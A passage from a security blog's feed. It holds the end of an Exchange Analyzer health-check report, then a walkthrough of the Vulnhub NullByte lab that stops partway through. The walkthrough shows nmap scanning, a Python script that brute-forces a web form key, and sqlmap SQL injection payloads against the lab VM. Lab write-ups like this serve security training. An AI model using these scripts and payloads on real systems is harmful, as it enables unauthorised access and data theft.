                  &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;CAS001&lt;/td&gt;&lt;td&gt;Client Access&lt;/td&gt;&lt;td&gt;Client Access Namespaces&lt;/td&gt;&lt;td class="fail"&gt;Failed&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;&lt;ul&gt;&lt;li&gt;AAA-BB-PROJET&lt;/li&gt;&lt;li&gt;AAA-SUD-PROJET&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;td&gt;One or more Exchange sites has more than one namespace per HTTPS protocol.&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/CAS001" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;tr&gt;&lt;td&gt;CAS002&lt;/td&gt;&lt;td&gt;Client Access&lt;/td&gt;&lt;td&gt;Server FQDNs in URLs&lt;/td&gt;&lt;td class="pass"&gt;Passed&lt;/td&gt;&lt;td&gt;&lt;ul&gt;&lt;li&gt;WindowsServer1&lt;/li&gt;&lt;li&gt;WindowsServer2&lt;/li&gt;&lt;li&gt;WindowsServer3&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;No Exchange HTTPS services have URLs containing server FQDNs.&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/CAS002" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;/table&gt;&lt;/p&gt;&lt;h2&gt;Category: Databases&lt;/h2&gt;&lt;p&gt;
                  &lt;table&gt;
                  &lt;tr&gt;
                  &lt;th&gt;Test ID&lt;/th&gt;
                  &lt;th&gt;Test Category&lt;/th&gt;
                  &lt;th&gt;Test Name&lt;/th&gt;
                  &lt;th&gt;Test Outcome&lt;/th&gt;
                  &lt;th&gt;Passed Objects&lt;/th&gt;
                  &lt;th&gt;Failed Objects&lt;/th&gt;
                  &lt;th&gt;Comments&lt;/th&gt;
                  &lt;th&gt;Reference&lt;/th&gt;
                  &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;DB001&lt;/td&gt;&lt;td&gt;Databases&lt;/td&gt;&lt;td&gt;Database Backups&lt;/td&gt;&lt;td class="fail"&gt;Failed&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;&lt;ul&gt;&lt;li&gt;DAG2-DB01 (Never)&lt;/li&gt;&lt;li&gt;DAG2-DB13 (Never)&lt;/li&gt;&lt;li&gt;DAG1-DB36 (Never)&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;td&gt;One or more Exchange databases has not been backed up within the last 24 hours.&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/DB001" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;/table&gt;&lt;/p&gt;&lt;h2&gt;Category: Active Directory&lt;/h2&gt;&lt;p&gt;
                  &lt;table&gt;
                  &lt;tr&gt;
                  &lt;th&gt;Test ID&lt;/th&gt;
                  &lt;th&gt;Test Category&lt;/th&gt;
                  &lt;th&gt;Test Name&lt;/th&gt;
                  &lt;th&gt;Test Outcome&lt;/th&gt;
                  &lt;th&gt;Passed Objects&lt;/th&gt;
                  &lt;th&gt;Failed Objects&lt;/th&gt;
                  &lt;th&gt;Comments&lt;/th&gt;
                  &lt;th&gt;Reference&lt;/th&gt;
                  &lt;/tr&gt;&lt;tr&gt;&lt;td&gt;AD001&lt;/td&gt;&lt;td&gt;Active Directory&lt;/td&gt;&lt;td&gt;AD Domain Level&lt;/td&gt;&lt;td class="pass"&gt;Passed&lt;/td&gt;&lt;td&gt;&lt;ul&gt;&lt;li&gt;client.local (Windows Server 2008 R2)&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;All Active Directory domains meet the required functional level.&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/AD001" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;tr&gt;&lt;td&gt;AD002&lt;/td&gt;&lt;td&gt;Active Directory&lt;/td&gt;&lt;td&gt;AD Forest Level&lt;/td&gt;&lt;td class="pass"&gt;Passed&lt;/td&gt;&lt;td&gt;&lt;ul&gt;&lt;li&gt;client.local (Windows Server 2008 R2)&lt;/li&gt;&lt;/ul&gt;&lt;/td&gt;&lt;td&gt;n/a&lt;/td&gt;&lt;td&gt;The Active Directory forest meets the required functional level.&lt;/td&gt;&lt;td&gt;&lt;a href="https://github.com/cunninghamp/ExchangeAnalyzer/wiki/AD002" target="_blank"&gt;More Info&lt;/a&gt;&lt;/td&gt;&lt;/table&gt;&lt;/p&gt;&lt;p align="center"&gt;Report created by &lt;a href="http://exchangeanalyzer.com"&gt;Exchange Analyzer&lt;/a&gt;&lt;/p&gt;
        &lt;/body&gt;
&lt;/html&gt;&lt;/p&gt;</content><category term="security"></category><category term="Exchange"></category><category term="Microsoft"></category></entry><entry><title>Vulnhub - NullByte</title><link href="https://matthieukeller.com/2015/09/vulnhub-nullbyte.html" rel="alternate"></link><published>2015-09-11T16:55:00+02:00</published><updated>2015-09-11T16:55:00+02:00</updated><author><name>Matthieu Keller</name></author><id>tag:matthieukeller.com,2015-09-11:/2015/09/vulnhub-nullbyte.html</id><summary type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.09/main.gif" alt="NullByte" width="162"&gt;&lt;/p&gt;
&lt;p&gt;After the &lt;a href="http://matthieukeller.com/2015/09/acid.html"&gt;Acid&lt;/a&gt; challenge I was
really motivated. Therefore I give a look at another vulnhub machine I had already
download since a while:
&lt;a href="https://www.vulnhub.com/entry/nullbyte-1,126/"&gt;NullByte&lt;/a&gt;.&lt;/p&gt;
</summary><content type="html">&lt;p&gt;&lt;img class="align-left"
src="/media/2015.09/main.gif" alt="NullByte" width="162"&gt;&lt;/p&gt;
&lt;p&gt;After the &lt;a href="http://matthieukeller.com/2015/09/acid.html"&gt;Acid&lt;/a&gt; challenge I was
really motivated. Therefore I give a look at another vulnhub machine I had already
download since a while:
&lt;a href="https://www.vulnhub.com/entry/nullbyte-1,126/"&gt;NullByte&lt;/a&gt;.&lt;/p&gt;


&lt;p&gt;The goal is to root the server.&lt;/p&gt;
&lt;h2&gt;Host discovery&lt;/h2&gt;
&lt;p&gt;As always, we start with the host discovery with &lt;a href="http://nmap.org"&gt;nmap&lt;/a&gt;,
&lt;a href="https://cirt.net/Nikto2"&gt;nikto&lt;/a&gt; and
&lt;a href="https://www.owasp.org/index.php/Category:OWASP_DirBuster_Project"&gt;dirbuster&lt;/a&gt;:&lt;/p&gt;
&lt;h3&gt;nmap&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nmap 192.168.0.20 -p0-65535 -A -oA nmap
# Nmap 6.47 scan initiated Thu Sep 10 10:01:29 2015 as: nmap -p0-65535 -A -oA nmap 192.168.0.20
Nmap scan report for 192.168.0.20
Host is up (0.0089s latency).
Not shown: 65532 closed ports
PORT      STATE SERVICE VERSION
80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
|_http-title: Null Byte 00 - level 1
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo:
|   program version   port/proto  service
|   100000  2,3,4        111/tcp  rpcbind
|   100000  2,3,4        111/udp  rpcbind
|   100024  1          34677/tcp  status
|_  100024  1          37785/udp  status
777/tcp   open  ssh     OpenSSH 6.7p1 Debian 5 (protocol 2.0)
|_ssh-hostkey: ERROR: Script execution failed (use -d to debug)
34677/tcp open  status  1 (RPC #100024)
MAC Address: A0:88:B4:C7:17:2C (Intel Corporate)
Device type: general purpose
Running: Linux 3.X
OS CPE: cpe:/o:linux:linux_kernel:3
OS details: Linux 3.11 - 3.14
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;There is an HTTP server on the port 80 and an ssh service on port 777.&lt;/p&gt;
&lt;h2&gt;Exploitation&lt;/h2&gt;
&lt;p&gt;The web server display a picture with a simple message. Neither nikto nor
dirbuster give us some lead.  Let us run &lt;code&gt;exiftool&lt;/code&gt; on the picture:&lt;/p&gt;
&lt;h3&gt;main.gif&lt;/h3&gt;
&lt;p&gt;&lt;img alt="main.gif" src="/media/2015.09/main.gif"&gt;&lt;/p&gt;
&lt;p&gt;The comment filed is interesting:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ExifTool Version Number         : 8.60
File Name                       : main.gif
Directory                       : .
File Size                       : 16 kB
File Modification Date/Time     : 2015:09:10 10:07:39+02:00
File Permissions                : rw-r--r--
File Type                       : GIF
MIME Type                       : image/gif
GIF Version                     : 89a
Image Width                     : 235
Image Height                    : 302
Has Color Map                   : No
Color Resolution Depth          : 8
Bits Per Pixel                  : 1
Background Color                : 0
Comment                         : P-): kzMb5nVYJw
Image Size                      : 235x302
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;What can we do with that?&lt;/p&gt;
&lt;h3&gt;kzMb5nVYJw&lt;/h3&gt;
&lt;p&gt;If we put this at the end of our url with land on another page. Dirbuster will
never have find something like that!&lt;/p&gt;
&lt;p&gt;It is a simple web page asking us for a key. When looking at the page code we
notice:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;lt;!-- this form isn't connected to mysql, password ain't that complex --!&amp;gt;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If there is no SQL injection and the password is simple we need to bruteforce it.
I am not a huge fan of bruteforce but I wrote a simple script that use one of my
password dictionary (mostly common word).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kn"&gt;import&lt;/span&gt; &lt;span class="nn"&gt;requests&lt;/span&gt;

&lt;span class="n"&gt;url&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://192.168.0.20/kzMb5nVYJw/index.php&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nb"&gt;open&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;/usr/share/dict/cracklib-small&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;r&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;key&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;while&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;invalid&amp;#39;&lt;/span&gt; &lt;span class="ow"&gt;in&lt;/span&gt; &lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="n"&gt;f&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;readline&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;strip&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
    &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;key&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
    &lt;span class="n"&gt;r&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;post&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;url&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;

&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;password&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;r&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;text&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The password was "elite" and by entering it, we land on a new page.&lt;/p&gt;
&lt;h3&gt;420search.php&lt;/h3&gt;
&lt;p&gt;The &lt;code&gt;420search.php&lt;/code&gt; page let us query for an user. If we search 'plop' we got:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Fetched data successfully&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;If we search nothing we got:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;EMP ID :1
EMP NAME : ramses
EMP POSITION :&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;EMP ID :2
EMP NAME : isis
EMP POSITION : employee&lt;/p&gt;
&lt;hr&gt;
&lt;p&gt;Fetched data successfully&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;This time it is probably a SQL injection as there is no mention against it in
the source code :D. If we introduce a double quote we got:&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;Could not get data: You have an error in your SQL syntax; check the manual
that corresponds to your MySQL server version for the right syntax to use near
'%"' at line 1&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;It looks like an SQL injection.&lt;/p&gt;
&lt;h3&gt;SQLi&lt;/h3&gt;
&lt;p&gt;Let us launch &lt;a href="http://sqlmap.org"&gt;sqlmap&lt;/a&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;maggick&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;rootine&lt;/span&gt; &lt;span class="nx"&gt;sqlmap&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt; &lt;span class="nt"&gt;python2&lt;/span&gt; &lt;span class="nt"&gt;sqlmap&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;py&lt;/span&gt; &lt;span class="nt"&gt;-u&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;http://192.168.0.20/kzMb5nVYJw/420search.php?usrtosearch=plop&amp;#39;&lt;/span&gt;
         &lt;span class="nt"&gt;_&lt;/span&gt;
 &lt;span class="nt"&gt;___&lt;/span&gt; &lt;span class="nt"&gt;___&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;_____&lt;/span&gt; &lt;span class="nt"&gt;___&lt;/span&gt; &lt;span class="nt"&gt;___&lt;/span&gt;  &lt;span class="p"&gt;{&lt;/span&gt;&lt;span class="err"&gt;1.0-dev-e8f87bf&lt;/span&gt;&lt;span class="p"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;|&lt;/span&gt;&lt;span class="nt"&gt;_&lt;/span&gt; &lt;span class="nt"&gt;-&lt;/span&gt;&lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt;     &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;| . |&lt;/span&gt;
&lt;span class="s1"&gt;|___|_  |_|_|_|_|__,|  _|&lt;/span&gt;
&lt;span class="s1"&gt;      |_|           |_|   http://sqlmap.org&lt;/span&gt;

&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;!&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="s1"&gt; legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user&amp;#39;&lt;/span&gt;&lt;span class="nt"&gt;s&lt;/span&gt; &lt;span class="nt"&gt;responsibility&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;obey&lt;/span&gt; &lt;span class="nt"&gt;all&lt;/span&gt; &lt;span class="nt"&gt;applicable&lt;/span&gt; &lt;span class="nt"&gt;local&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="nt"&gt;state&lt;/span&gt; &lt;span class="nt"&gt;and&lt;/span&gt; &lt;span class="nt"&gt;federal&lt;/span&gt; &lt;span class="nt"&gt;laws&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt; &lt;span class="nt"&gt;Developers&lt;/span&gt; &lt;span class="nt"&gt;assume&lt;/span&gt; &lt;span class="nt"&gt;no&lt;/span&gt; &lt;span class="nt"&gt;liability&lt;/span&gt; &lt;span class="nt"&gt;and&lt;/span&gt; &lt;span class="nt"&gt;are&lt;/span&gt; &lt;span class="nt"&gt;not&lt;/span&gt; &lt;span class="nt"&gt;responsible&lt;/span&gt; &lt;span class="nt"&gt;for&lt;/span&gt; &lt;span class="nt"&gt;any&lt;/span&gt; &lt;span class="nt"&gt;misuse&lt;/span&gt; &lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;damage&lt;/span&gt; &lt;span class="nt"&gt;caused&lt;/span&gt; &lt;span class="nt"&gt;by&lt;/span&gt; &lt;span class="nt"&gt;this&lt;/span&gt; &lt;span class="nt"&gt;program&lt;/span&gt;

&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="o"&gt;*&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;starting&lt;/span&gt; &lt;span class="nt"&gt;at&lt;/span&gt; &lt;span class="nt"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="nd"&gt;23&lt;/span&gt;

&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;INFO&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;resuming&lt;/span&gt; &lt;span class="nt"&gt;back-end&lt;/span&gt; &lt;span class="nt"&gt;DBMS&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;mysql&amp;#39;&lt;/span&gt; 
&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;INFO&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;testing&lt;/span&gt; &lt;span class="nt"&gt;connection&lt;/span&gt; &lt;span class="nt"&gt;to&lt;/span&gt; &lt;span class="nt"&gt;the&lt;/span&gt; &lt;span class="nt"&gt;target&lt;/span&gt; &lt;span class="nt"&gt;URL&lt;/span&gt;
&lt;span class="nt"&gt;sqlmap&lt;/span&gt; &lt;span class="nt"&gt;identified&lt;/span&gt; &lt;span class="nt"&gt;the&lt;/span&gt; &lt;span class="nt"&gt;following&lt;/span&gt; &lt;span class="nt"&gt;injection&lt;/span&gt; &lt;span class="nt"&gt;points&lt;/span&gt; &lt;span class="nt"&gt;with&lt;/span&gt; &lt;span class="nt"&gt;a&lt;/span&gt; &lt;span class="nt"&gt;total&lt;/span&gt; &lt;span class="nt"&gt;of&lt;/span&gt; &lt;span class="nt"&gt;0&lt;/span&gt; &lt;span class="nt"&gt;HTTP&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;s&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;requests&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt;
&lt;span class="nt"&gt;---&lt;/span&gt;
&lt;span class="nt"&gt;Parameter&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;usrtosearch&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;GET&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="nt"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;boolean-based&lt;/span&gt; &lt;span class="nt"&gt;blind&lt;/span&gt;
    &lt;span class="nt"&gt;Title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;OR&lt;/span&gt; &lt;span class="nt"&gt;boolean-based&lt;/span&gt; &lt;span class="nt"&gt;blind&lt;/span&gt; &lt;span class="nt"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;WHERE&lt;/span&gt; &lt;span class="nt"&gt;or&lt;/span&gt; &lt;span class="nt"&gt;HAVING&lt;/span&gt; &lt;span class="nt"&gt;clause&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;MySQL&lt;/span&gt; &lt;span class="nt"&gt;comment&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;
    &lt;span class="nt"&gt;Payload&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;usrtosearch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;-8936&lt;/span&gt;&lt;span class="s2"&gt;&amp;quot; OR 8832=8832#&lt;/span&gt;

&lt;span class="s2"&gt;    Type: AND/OR time-based blind&lt;/span&gt;
&lt;span class="s2"&gt;    Title: MySQL &amp;amp;gt;= 5.0.12 AND time-based blind (SELECT - comment)&lt;/span&gt;
&lt;span class="s2"&gt;    Payload: usrtosearch=plop&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;AND&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;SELECT&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="nt"&gt;FROM&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;SELECT&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;SLEEP&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;5&lt;/span&gt;&lt;span class="o"&gt;)))&lt;/span&gt;&lt;span class="nt"&gt;bhRc&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;

    &lt;span class="nt"&gt;Type&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;UNION&lt;/span&gt; &lt;span class="nt"&gt;query&lt;/span&gt;
    &lt;span class="nt"&gt;Title&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;MySQL&lt;/span&gt; &lt;span class="nt"&gt;UNION&lt;/span&gt; &lt;span class="nt"&gt;query&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;NULL&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="nt"&gt;-&lt;/span&gt; &lt;span class="nt"&gt;3&lt;/span&gt; &lt;span class="nt"&gt;columns&lt;/span&gt;
    &lt;span class="nt"&gt;Payload&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;usrtosearch&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="nt"&gt;plop&lt;/span&gt;&lt;span class="err"&gt;&amp;quot;&lt;/span&gt; &lt;span class="nt"&gt;UNION&lt;/span&gt; &lt;span class="nt"&gt;ALL&lt;/span&gt; &lt;span class="nt"&gt;SELECT&lt;/span&gt; &lt;span class="nt"&gt;CONCAT&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="nt"&gt;0x71706b7871&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x5355686d62645446514a&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;0x7162716271&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt;&lt;span class="nt"&gt;NULL&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt;&lt;span class="nt"&gt;NULL&lt;/span&gt;&lt;span class="err"&gt;#&lt;/span&gt;
&lt;span class="nt"&gt;---&lt;/span&gt;
&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="mi"&gt;15&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;25&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;&lt;span class="mi"&gt;23&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;INFO&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt; &lt;span class="nt"&gt;the&lt;/span&gt; &lt;span class="nt"&gt;back-end&lt;/span&gt; &lt;span class="nt"&gt;DBMS&lt;/span&gt; &lt;span class="nt"&gt;is&lt;/span&gt; &lt;span class="nt"&gt;MySQL&lt;/span&gt;
&lt;span class="nt"&gt;web&lt;/span&gt; &lt;span class="nt"&gt;server&lt;/span&gt; &lt;span class="nt"&gt;operating&lt;/span&gt; &lt;span class="nt"&gt;system&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;Linux&lt;/span&gt; &lt;span class="nt"&gt;Debian&lt;/span&gt;
&lt;span class="nt"&gt;web&lt;/span&gt; &lt;span class="nt"&gt;application&lt;/span&gt; &lt;span class="nt"&gt;technology&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;Apache&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;4&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;10&lt;/span&gt;
&lt;span class="nt"&gt;back-end&lt;/span&gt; &lt;span class="nt"&gt;DBMS&lt;/span&gt;&lt;span class="o"&gt;:&lt;/span&gt; &lt;span class="nt"&gt;MySQL&lt;/span&gt; &lt;span class="nt"&gt;5&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;0&lt;/span&gt;&lt;span class="p"&gt;.&lt;/span&gt;&lt;span class="nc"&gt;12&lt;/span&gt;
